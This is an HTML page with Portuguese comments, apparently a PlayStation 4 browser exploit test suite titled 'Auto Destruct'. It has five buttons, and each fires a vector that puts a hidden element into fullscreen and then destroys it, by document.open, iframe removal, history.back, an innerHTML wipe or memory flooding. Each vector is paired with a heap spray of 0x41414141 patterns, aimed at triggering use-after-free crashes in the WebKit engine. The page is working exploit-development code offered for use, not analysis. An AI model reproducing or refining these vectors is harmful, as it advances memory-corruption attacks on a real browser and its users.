<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v590000: Auto Destruct</title>
<style>
    body { background: #000; color: #f00; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #f00; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #200; color: #fff; font-weight: bold;
    }
    .ghost { display: none; width: 100px; height: 100px; background: red; }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #300; color: #fff; border: 2px solid #f00;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #f00; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v590000: AUTO DESTRUCT</h1>

<div class="status" id="msg">
    OBJETIVO: CRASH AUTOMÁTICO (SEM REFRESH MANUAL)<br>
    CLIQUE -> ALERTA (OK) -> O SCRIPT SE DESTRÓI
</div>

<button onclick="autocrash(a01)">01. Document.Open() Nuke</button>

<button onclick="autocrash(a02)">02. Iframe Parent Kill</button>

<button onclick="autocrash(a03)">03. History.Back() Force</button>

<button onclick="autocrash(a04)">04. InnerHTML Recursive Wipe</button>

<button onclick="autocrash(a05)">05. GC Flood (OOM Killer)</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // Spray
    let junk = [];
    const pattern = new Uint32Array(1024).fill(0x41414141);

    function autocrash(vectorFunc) {
        Stage.innerHTML = "";
        junk = [];
        
        // 1. Configura
        const element = vectorFunc(Stage);
        
        // 2. Dispara a lógica
        setTimeout(() => {
            if(element.trigger) element.trigger();
        }, 50);
    }

    // =================================================================
    // 01. Document.Open() Nuke
    // O document.open() apaga todo o DOM e streams ativos.
    // É o equivalente JS mais próximo de um "Refresh".
    // =================================================================
    function a01(stage) {
        const d = document.createElement('div');
        d.className = 'ghost'; // Invisível
        stage.appendChild(d);

        d.trigger = () => {
            window.alert("⚠️ AUTO-WIPE ⚠️\nAo clicar OK: Fullscreen -> Document.Open()");
            
            // 1. Fullscreen no invisível (Gatilho do Bug)
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            
            // 2. O CRASH AUTOMÁTICO
            // Limpa o documento imediatamente, matando o elemento 'd'
            // enquanto o navegador tenta colocá-lo em tela cheia.
            document.open();
            document.write("<h1>SYSTEM HALTED</h1>");
            document.close();
            
            // Spray no novo documento
            junk.push(new ArrayBuffer(1024*1024));
        };
        return d;
    }

    // =================================================================
    // 02. Iframe Suicide
    // Criamos um Iframe. O bug acontece DENTRO do Iframe.
    // O Pai (esta página) mata o Iframe de fora.
    // =================================================================
    function a02(stage) {
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);
        
        ifr.onload = () => {
            const doc = ifr.contentDocument;
            const target = doc.createElement('div');
            target.style.display = 'none'; // O bug
            doc.body.appendChild(target);
            
            ifr.trigger = () => {
                window.alert("⚠️ IFRAME KILL ⚠️\nAo clicar OK: Fullscreen no Iframe -> Remover Iframe.");
                
                // 1. Fullscreen interno
                if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
                
                // 2. O CRASH AUTOMÁTICO
                // Removemos o Iframe do DOM principal.
                // Isso destrói o contexto de navegação violentamente.
                ifr.remove();
                
                // Spray no pai
                for(let i=0; i<2000; i++) junk.push(new Uint32Array(pattern));
            };
        };
        if(!ifr.trigger) ifr.trigger = ()=>{};
        return ifr;
    }

    // =================================================================
    // 03. History.Back() Force
    // Empurra um estado no histórico e volta imediatamente.
    // Navegar para trás é um processo de "Destruição e Reconstrução".
    // =================================================================
    function a03(stage) {
        const d = document.createElement('div');
        d.className = 'ghost';
        stage.appendChild(d);
        
        // Cria histórico fake
        history.pushState({page:1}, "t", "#new");

        d.trigger = () => {
            window.alert("⚠️ HISTORY NUKE ⚠️\nAo clicar OK: Fullscreen -> Voltar Página.");
            
            // 1. Fullscreen
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            
            // 2. O CRASH AUTOMÁTICO
            // Força o navegador a descartar a página atual
            history.back();
            
            // Tenta bloquear a thread para garantir que o fullscreen processou
            const s = Date.now();
            while(Date.now() - s < 100); 
        };
        return d;
    }

    // =================================================================
    // 04. InnerHTML Recursive Wipe
    // Substitui o HTML do body por ele mesmo repetidamente.
    // Isso causa uma tempestade de destruição e recriação de objetos.
    // =================================================================
    function a04(stage) {
        const d = document.createElement('div');
        d.className = 'ghost';
        stage.appendChild(d);

        d.trigger = () => {
            window.alert("⚠️ RECURSIVE WIPE ⚠️\nAo clicar OK: Fullscreen -> HTML Chaos.");
            
            // 1. Fullscreen
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            
            // 2. O CRASH AUTOMÁTICO
            // Define o innerHTML para destruir o objeto 'd'
            document.body.innerHTML = "<h1>CRASHING...</h1>";
            
            // Spray imediato
            let s = [];
            for(let i=0; i<5000; i++) s.push(new Float64Array(10));
        };
        return d;
    }

    // =================================================================
    // 05. GC Flood (OOM Killer)
    // Em vez de destruir o objeto, destruímos a RAM inteira.
    // Alocamos memória até o navegador ser forçado a matar processos.
    // =================================================================
    function a05(stage) {
        const d = document.createElement('div');
        d.className = 'ghost';
        stage.appendChild(d);

        d.trigger = () => {
            window.alert("⚠️ MEMORY FLOOD ⚠️\nAo clicar OK: Fullscreen -> Encher RAM.");
            
            // 1. Fullscreen
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            
            // 2. O CRASH AUTOMÁTICO (Pressão no GC)
            d.remove(); // Remove o alvo
            
            // Loop de alocação suicida
            try {
                const huge = [];
                while(true) {
                    huge.push(new Uint8Array(1024 * 1024 * 10)); // Blocos de 10MB
                    if(huge.length > 500) break; // ~5GB (Vai crashar antes)
                }
            } catch(e) {}
        };
        return d;
    }

</script>
</body>
</html>
